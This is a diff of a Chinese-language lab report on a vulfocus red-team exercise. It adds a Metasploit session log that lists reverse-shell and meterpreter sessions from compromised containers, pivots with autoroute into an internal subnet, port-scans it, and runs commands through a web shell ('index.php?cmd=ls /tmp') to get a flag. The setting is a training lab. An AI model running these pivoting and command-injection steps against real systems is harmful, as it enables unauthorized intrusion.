@@ -288,6 +288,277 @@
   
   所谓的漏洞打包镜像，说白了不就和黑盒没什么区别吗，排错噩梦，不过倒是也说明了为什么完成了4台机器就已经提示通过了，因为第五台是宕机状态啊😂
 
+- 2023年7月25日，已经在写报告了，准备复现上面说到的`Exited(1)`的问题时，原本有问题的最后一台Nginx漏洞容器，突然就又好了，于是尝试从头再走一遍流程，姑且要好好完成这个环境😔
+
+  ![screenShot](./img/2023-07-25-184854.png)
+
+- 2023年7月25日，很熟练地走完了流程，拿到了最后一台机器的flag，和课程视频中演示的通过手动proxychains代理再使用传统nmap扫描不同，这边选择了尽可能不离开Metasploit，通过前面用过的meterpreter中开启autoroute代理，随后再使用portscan工具扫描端口开放情况，以下code block内容中是全部操作的记录：
+
+  ```metasploit
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions
+
+  Active sessions
+  ===============
+
+    Id  Name  Type                   Information          Connection
+    --  ----  ----                   -----------          ----------
+    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60572 (172.29.108.146)
+    2         meterpreter x86/linux  root @ 192.171.84.5  192.168.56.107:4433 -> 192.168.56.1:60630 (172.29.108.146)
+    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60568 (192.171.84.2)
+    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60638 (192.171.84.3)
+    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60570 (192.171.84.4)
+    6         meterpreter x86/linux  root @ 192.172.85.3  192.168.56.107:4433 -> 192.168.56.1:60608 (192.171.84.2)
+    7         meterpreter x86/linux  root @ 192.171.84.3  192.168.56.107:4433 -> 192.168.56.1:60580 (192.171.84.3)
+    8         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60582 (192.171.84.4)
+
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 6
+  [*] Starting interaction with 6...
+
+  meterpreter > ipconfig
+
+  Interface  1
+  ============
+  Name         : lo
+  Hardware MAC : 00:00:00:00:00:00
+  MTU          : 65536
+  Flags        : UP,LOOPBACK
+  IPv4 Address : 127.0.0.1
+  IPv4 Netmask : 255.0.0.0
+
+
+  Interface 23
+  ============
+  Name         : eth1
+  Hardware MAC : 02:42:c0:ab:54:02
+  MTU          : 1500
+  Flags        : UP,BROADCAST,MULTICAST
+  IPv4 Address : 192.171.84.2
+  IPv4 Netmask : 255.255.255.0
+
+
+  Interface 31
+  ============
+  Name         : eth0
+  Hardware MAC : 02:42:c0:ac:55:03
+  MTU          : 1500
+  Flags        : UP,BROADCAST,MULTICAST
+  IPv4 Address : 192.172.85.3
+  IPv4 Netmask : 255.255.255.0
+
+  meterpreter > run autoroute -s 192.172.85.0/24
+
+  [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+  [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+  [*] Adding a route to 192.172.85.0/255.255.255.0...
+  [+] Added route to 192.172.85.0/255.255.255.0 via 192.168.56.1
+  [*] Use the -p option to list all active routes
+  meterpreter > run autoroute -p
+
+  [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+  [!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+  Active Routing Table
+  ====================
+
+    Subnet             Netmask            Gateway
+    ------             -------            -------
+    192.171.84.0       255.255.255.0      Session 2
+    192.172.85.0       255.255.255.0      Session 6
+
+  meterpreter >
+  Background session 6? [y/N]
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > search portscan
+
+  Matching Modules
+  ================
+
+    #  Name                                              Disclosure Date  Rank    Check  Description
+    -  ----                                              ---------------  ----    -----  -----------
+    0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
+    1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
+    2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
+    3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
+    4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
+    5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
+    6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
+    7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
+
+
+  Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
+
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > use 5
+  msf6 auxiliary(scanner/portscan/tcp) > options
+
+  Module options (auxiliary/scanner/portscan/tcp):
+
+    Name         Current Setting   Required  Description
+    ----         ---------------   --------  -----------
+    CONCURRENCY  10                yes       The number of concurrent ports to check per host
+    DELAY        0                 yes       The delay between connections, per thread, in milliseconds
+    JITTER       0                 yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseco
+                                              nds.
+    PORTS        7001              yes       Ports to scan (e.g. 22-25,80,110-900)
+    RHOSTS       192.171.84.2-254  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                              basics/using-metasploit.html
+    THREADS      1                 yes       The number of concurrent threads (max one per host)
+    TIMEOUT      1000              yes       The socket connect timeout in milliseconds
+
+
+  View the full module info with the info, or info -d command.
+
+  msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.172.85.2-254
+  rhosts => 192.172.85.2-254
+  msf6 auxiliary(scanner/portscan/tcp) > set ports 80
+  ports => 80
+  msf6 auxiliary(scanner/portscan/tcp) > options
+
+  Module options (auxiliary/scanner/portscan/tcp):
+
+    Name         Current Setting   Required  Description
+    ----         ---------------   --------  -----------
+    CONCURRENCY  10                yes       The number of concurrent ports to check per host
+    DELAY        0                 yes       The delay between connections, per thread, in milliseconds
+    JITTER       0                 yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseco
+                                              nds.
+    PORTS        80                yes       Ports to scan (e.g. 22-25,80,110-900)
+    RHOSTS       192.172.85.2-254  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                              basics/using-metasploit.html
+    THREADS      1                 yes       The number of concurrent threads (max one per host)
+    TIMEOUT      1000              yes       The socket connect timeout in milliseconds
+
+
+  View the full module info with the info, or info -d command.
+
+  msf6 auxiliary(scanner/portscan/tcp) > set threads 16
+  threads => 16
+  msf6 auxiliary(scanner/portscan/tcp) > options
+
+  Module options (auxiliary/scanner/portscan/tcp):
+
+    Name         Current Setting   Required  Description
+    ----         ---------------   --------  -----------
+    CONCURRENCY  10                yes       The number of concurrent ports to check per host
+    DELAY        0                 yes       The delay between connections, per thread, in milliseconds
+    JITTER       0                 yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseco
+                                              nds.
+    PORTS        80                yes       Ports to scan (e.g. 22-25,80,110-900)
+    RHOSTS       192.172.85.2-254  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
+                                              basics/using-metasploit.html
+    THREADS      16                yes       The number of concurrent threads (max one per host)
+    TIMEOUT      1000              yes       The socket connect timeout in milliseconds
+
+
+  View the full module info with the info, or info -d command.
+
+  msf6 auxiliary(scanner/portscan/tcp) > run
+
+  [+] 192.172.85.2:         - 192.172.85.2:80 - TCP OPEN
+  [*] 192.172.85.2-254:     - Scanned  26 of 253 hosts (10% complete)
+  [*] 192.172.85.2-254:     - Scanned  51 of 253 hosts (20% complete)
+  [*] 192.172.85.2-254:     - Scanned  77 of 253 hosts (30% complete)
+  [*] 192.172.85.2-254:     - Scanned 102 of 253 hosts (40% complete)
+  [*] 192.172.85.2-254:     - Scanned 130 of 253 hosts (51% complete)
+  [*] 192.172.85.2-254:     - Scanned 152 of 253 hosts (60% complete)
+  [*] 192.172.85.2-254:     - Scanned 178 of 253 hosts (70% complete)
+  [*] 192.172.85.2-254:     - Scanned 203 of 253 hosts (80% complete)
+  [*] 192.172.85.2-254:     - Scanned 228 of 253 hosts (90% complete)
+  [*] 192.172.85.2-254:     - Scanned 253 of 253 hosts (100% complete)
+  [*] Auxiliary module execution completed
+  msf6 auxiliary(scanner/portscan/tcp) > sessions
+
+  Active sessions
+  ===============
+
+    Id  Name  Type                   Information          Connection
+    --  ----  ----                   -----------          ----------
+    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60572 (172.29.108.146)
+    2         meterpreter x86/linux  root @ 192.171.84.5  192.168.56.107:4433 -> 192.168.56.1:60630 (172.29.108.146)
+    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60568 (192.171.84.2)
+    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60638 (192.171.84.3)
+    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60570 (192.171.84.4)
+    6         meterpreter x86/linux  root @ 192.172.85.3  192.168.56.107:4433 -> 192.168.56.1:60608 (192.171.84.2)
+    7         meterpreter x86/linux  root @ 192.171.84.3  192.168.56.107:4433 -> 192.168.56.1:60580 (192.171.84.3)
+    8         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60582 (192.171.84.4)
+
+  msf6 auxiliary(scanner/portscan/tcp) > sessions -i 6
+  [*] Starting interaction with 6...
+
+  meterpreter > ipconifg
+  [-] Unknown command: ipconifg
+  meterpreter > ipconfig
+
+  Interface  1
+  ============
+  Name         : lo
+  Hardware MAC : 00:00:00:00:00:00
+  MTU          : 65536
+  Flags        : UP,LOOPBACK
+  IPv4 Address : 127.0.0.1
+  IPv4 Netmask : 255.0.0.0
+
+
+  Interface 23
+  ============
+  Name         : eth1
+  Hardware MAC : 02:42:c0:ab:54:02
+  MTU          : 1500
+  Flags        : UP,BROADCAST,MULTICAST
+  IPv4 Address : 192.171.84.2
+  IPv4 Netmask : 255.255.255.0
+
+
+  Interface 31
+  ============
+  Name         : eth0
+  Hardware MAC : 02:42:c0:ac:55:03
+  MTU          : 1500
+  Flags        : UP,BROADCAST,MULTICAST
+  IPv4 Address : 192.172.85.3
+  IPv4 Netmask : 255.255.255.0
+
+  meterpreter > shell
+  Process 122 created.
+  Channel 254 created.
+  ping 192.172.85.2 -c 4
+  PING 192.172.85.2 (192.172.85.2) 56(84) bytes of data.
+  64 bytes from 192.172.85.2: icmp_seq=1 ttl=64 time=0.190 ms
+  64 bytes from 192.172.85.2: icmp_seq=2 ttl=64 time=0.119 ms
+  64 bytes from 192.172.85.2: icmp_seq=3 ttl=64 time=0.179 ms
+  64 bytes from 192.172.85.2: icmp_seq=4 ttl=64 time=0.098 ms
+
+  --- 192.172.85.2 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3089ms
+  rtt min/avg/max/mdev = 0.098/0.146/0.190/0.040 ms
+  wget "http://192.172.85.2/" -O /tmp/zzz && cat /tmp/zzz
+  --2023-07-25 10:57:02--  http://192.172.85.2/
+  Connecting to 192.172.85.2:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: unspecified [text/html]
+  Saving to: '/tmp/zzz'
+
+      0K                                                        1.53M=0s
+
+  2023-07-25 10:57:02 (1.53 MB/s) - '/tmp/zzz' saved [21]
+
+  index.php?cmd=ls /tmp
+  wget "http://192.172.85.2/index.php?cmd=ls /tmp" -O /tmp/zzzzz && cat /tmp/zzzzz
+  --2023-07-25 10:57:54--  http://192.172.85.2/index.php?cmd=ls%20/tmp
+  Connecting to 192.172.85.2:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: unspecified [text/html]
+  Saving to: '/tmp/zzzzz'
+
+      0K                                                        7.83M=0s
+
+  2023-07-25 10:57:54 (7.83 MB/s) - '/tmp/zzzzz' saved [68]
+
+  index.php?cmd=ls /tmpflag-{bmh6813cff7-ad78-49c7-8ee1-6f4b7629c640}
+  ```
+
+  提交拿到的flag，此时vulfocus平台页面上终于显示是100%了，舒服了😩
+
+    ![screenShot](./img/2023-07-25-190520.png)
+
 ### 第二回合
 
 >于是这一部分开始是蓝方检测到红方的攻击并进行一定对抗的第二回合，通过对抓取的攻击流量进行分析，尝试对漏洞利用进行拦截
@@ -326,3 +597,5 @@
 - 2023年7月22日，突然，居然，才，想到了早就应该想到的，直接筛选HTTP流量就可以快速得到所有漏洞利用的exploit，3k+的报文瞬间就剩下了9个，只能说最近脑子好像不太够用了...
 
   ![screenShot](./img/2023-07-22-172100.png)
+
+- 2023年7月24日，对比了多个发布在GitHub上的weblogic的exploit和截取到的攻击流量，没有太好的发现
